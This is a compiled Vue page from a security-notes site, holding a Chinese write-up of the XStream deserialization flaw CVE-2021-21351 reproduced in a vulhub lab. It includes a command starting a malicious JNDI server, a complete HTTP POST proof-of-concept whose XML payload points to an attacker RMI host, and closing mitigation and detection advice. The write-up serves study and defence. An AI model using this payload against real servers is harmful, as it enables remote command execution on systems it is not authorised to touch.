import{_ as o}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,a as e,d as n,e as l,b as r,o as i,r as g}from"./app-CsOLv5of.js";const c="/DailyNotes/assets/02-Bk1kwaQL.png",m="/DailyNotes/assets/03-B6Yw6IVb.png",d="/DailyNotes/assets/01-CYMwF1Yk.png",p={},u={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"},_={href:"https://www.veracode.com/blog/research/exploiting-jndi-injections-java",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/welk1n/JNDI-Injection-Exploit/",target:"_blank",rel:"noopener noreferrer"};function f(S,t){const a=g("ExternalLinkIcon");return i(),s("div",null,[t[9]||(t[9]=e("h1",{id:"漏洞名称-xstream-反序列化命令执行漏洞",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞名称-xstream-反序列化命令执行漏洞"},[e("span",null,"漏洞名称：XStream 反序列化命令执行漏洞")])],-1)),t[10]||(t[10]=e("hr",null,null,-1)),t[11]||(t[11]=e("h2",{id:"漏洞介绍",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞介绍"},[e("span",null,"漏洞介绍")])],-1)),e("blockquote",null,[e("p",null,[e("a",u,[t[0]||(t[0]=n("国家信息安全漏洞库 (cnnvd.org.cn)")),l(a)])])]),t[12]||(t[12]=r('<p>XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。XStream是自由软件，可以在BSD许可证的许可下分发。它是一种OXMapping 技术，是用来处理XML文件序列化的框架在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁琐。</p><p>XStream 在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.15 及之前版本黑名单存在缺陷，攻击者可利用<code>javax.naming.ldap.Rdn$RdnEntry</code>及<code>javax.sql.rowset.BaseRowSet</code>构造JNDI注入，进而执行任意命令。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><p>Xstream&lt;=1.4.15</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h2><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h2><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><p>vulhub/xstream/CVE-2021-21351</p><hr><h3 id="利用方式" tabindex="-1"><a class="header-anchor" href="#利用方式"><span>利用方式</span></a></h3>',16)),e("p",null,[t[2]||(t[2]=n("由于目标环境Java版本高于8u191，故我们需要借助")),e("a",_,[t[1]||(t[1]=n("这篇文章")),l(a)]),t[3]||(t[3]=n("中给出的方法，使用")),t[4]||(t[4]=e("code",null,"org.apache.naming.factory.BeanFactory",-1)),t[5]||(t[5]=n("加EL表达式注入的方式来执行任意命令。"))]),e("p",null,[t[7]||(t[7]=n("使用")),e("a",h,[t[6]||(t[6]=n("这个工具")),l(a)]),t[8]||(t[8]=n("启动恶意JNDI服务器："))]),t[13]||(t[13]=r(`<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/success&quot; -A 10.182.234.169
</code></pre><figure><img src="`+c+`" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>使用上图中基于SpringBoot利用链的RMI地址作为<code>&lt;dataSource&gt;</code>的值，构造POC如下：</p><pre><code>POST / HTTP/1.1
Host: 192.168.1.189:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/xml
Content-Length: 3185

&lt;sorted-set&gt;
  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;type&gt;ysomap&lt;/type&gt;
    &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#39;&gt;
      &lt;m__DTMXRTreeFrag&gt;
        &lt;m__dtm class=&#39;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#39;&gt;
          &lt;m__size&gt;-10086&lt;/m__size&gt;
          &lt;m__mgrDefault&gt;
            &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;
            &lt;m__incremental&gt;false&lt;/m__incremental&gt;
            &lt;m__source__location&gt;false&lt;/m__source__location&gt;
            &lt;m__dtms&gt;
              &lt;null/&gt;
            &lt;/m__dtms&gt;
            &lt;m__defaultHandler/&gt;
          &lt;/m__mgrDefault&gt;
          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;
          &lt;m__indexing&gt;false&lt;/m__indexing&gt;
          &lt;m__incrementalSAXSource class=&#39;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#39;&gt;
            &lt;fPullParserConfig class=&#39;com.sun.rowset.JdbcRowSetImpl&#39; serialization=&#39;custom&#39;&gt;
              &lt;javax.sql.rowset.BaseRowSet&gt;
                &lt;default&gt;
                  &lt;concurrency&gt;1008&lt;/concurrency&gt;
                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;
                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;
                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;
                  &lt;isolation&gt;2&lt;/isolation&gt;
                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;
                  &lt;maxRows&gt;0&lt;/maxRows&gt;
                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;
                  &lt;readOnly&gt;true&lt;/readOnly&gt;
                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;
                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;
                  &lt;dataSource&gt;rmi://10.182.234.169:1099/schsit&lt;/dataSource&gt;
                  &lt;listeners/&gt;
                  &lt;params/&gt;
                &lt;/default&gt;
              &lt;/javax.sql.rowset.BaseRowSet&gt;
              &lt;com.sun.rowset.JdbcRowSetImpl&gt;
                &lt;default/&gt;
              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
            &lt;/fPullParserConfig&gt;
            &lt;fConfigSetInput&gt;
              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;
              &lt;name&gt;setAutoCommit&lt;/name&gt;
              &lt;parameter-types&gt;
                &lt;class&gt;boolean&lt;/class&gt;
              &lt;/parameter-types&gt;
            &lt;/fConfigSetInput&gt;
            &lt;fConfigParse reference=&#39;../fConfigSetInput&#39;/&gt;
            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;
          &lt;/m__incrementalSAXSource&gt;
          &lt;m__walker&gt;
            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;
          &lt;/m__walker&gt;
          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;
          &lt;m__idAttributes/&gt;
          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;
          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;
          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;
        &lt;/m__dtm&gt;
        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;
      &lt;/m__DTMXRTreeFrag&gt;
      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;
      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;
    &lt;/value&gt;
  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;type&gt;ysomap&lt;/type&gt;
    &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&gt;
      &lt;m__obj class=&#39;string&#39;&gt;test&lt;/m__obj&gt;
    &lt;/value&gt;
  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
&lt;/sorted-set&gt;
</code></pre><p><strong>PS</strong> 在实战中，如果目标Java版本较低，POC需要做修改，将其中的<code>&lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;</code>改成<code>&lt;__useServicesMechanism&gt;false&lt;/__useServicesMechanism&gt;</code>即可。</p><p>发送poc后能够看到靶机来请求了恶意的rmi</p><figure><img src="`+m+'" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>进入目标容器内，可见<code>touch /tmp/success</code>已成功执行：</p><figure><img src="'+d+'" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议"><span>用户处置建议</span></a></h3><ol><li><p>配置XStream的安全框架为允许的类型使用白名单</p></li><li><p>注册自己的转换器，以防止解组当前已知的Java运行时关键类型</p></li><li><p>升级XStream到最新版本</p></li></ol><hr><h3 id="安全产品检测建议" tabindex="-1"><a class="header-anchor" href="#安全产品检测建议"><span>安全产品检测建议</span></a></h3><p>检测<code>javax.naming.ldap.Rdn_-RdnEntry</code>，<code>com.sun.org.apache.xpath.internal.objects.XRTreeFrag</code>, <code>com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM</code>, <code>com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces</code></p>',16))])}const v=o(p,[["render",f],["__file","xstream_CVE-2021-21351.html.vue"]]),X=JSON.parse('{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/xstream/xstream_CVE-2021-21351.html","title":"漏洞名称：XStream 反序列化命令执行漏洞","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"漏洞分析","description":"漏洞名称：XStream 反序列化命令执行漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。XStream是自由软件，可以在BSD许可证的许可下分发。它是一种OXMapping 技术，是用来处理XML文件序列化的框架在将javaBean序列化，或将XM...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/xstream/xstream_CVE-2021-21351.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"漏洞名称：XStream 反序列化命令执行漏洞"}],["meta",{"property":"og:description","content":"漏洞名称：XStream 反序列化命令执行漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。XStream是自由软件，可以在BSD许可证的许可下分发。它是一种OXMapping 技术，是用来处理XML文件序列化的框架在将javaBean序列化，或将XM..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-10T05:36:24.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"漏洞分析"}],["meta",{"property":"article:modified_time","content":"2025-01-10T05:36:24.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"漏洞名称：XStream 反序列化命令执行漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-01-10T05:36:24.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]},{"level":2,"title":"漏洞利用","slug":"漏洞利用","link":"#漏洞利用","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方式","slug":"利用方式","link":"#利用方式","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[{"level":3,"title":"用户处置建议","slug":"用户处置建议","link":"#用户处置建议","children":[]},{"level":3,"title":"安全产品检测建议","slug":"安全产品检测建议","link":"#安全产品检测建议","children":[]}]}],"git":{"createdTime":1731665131000,"updatedTime":1736487384000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":2}]},"readingTime":{"minutes":2.48,"words":743},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/xstream/xstream_CVE-2021-21351.md","localizedDate":"2024年11月15日","excerpt":"\\n<hr>\\n<h2>漏洞介绍</h2>\\n<blockquote>\\n<p><a href=\\"http://www.cnnvd.org.cn/index.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">国家信息安全漏洞库 (cnnvd.org.cn)</a></p>\\n</blockquote>\\n<p>XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。XStream是自由软件，可以在BSD许可证的许可下分发。它是一种OXMapping 技术，是用来处理XML文件序列化的框架在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁琐。</p>","autoDesc":true}');export{v as comp,X as data};
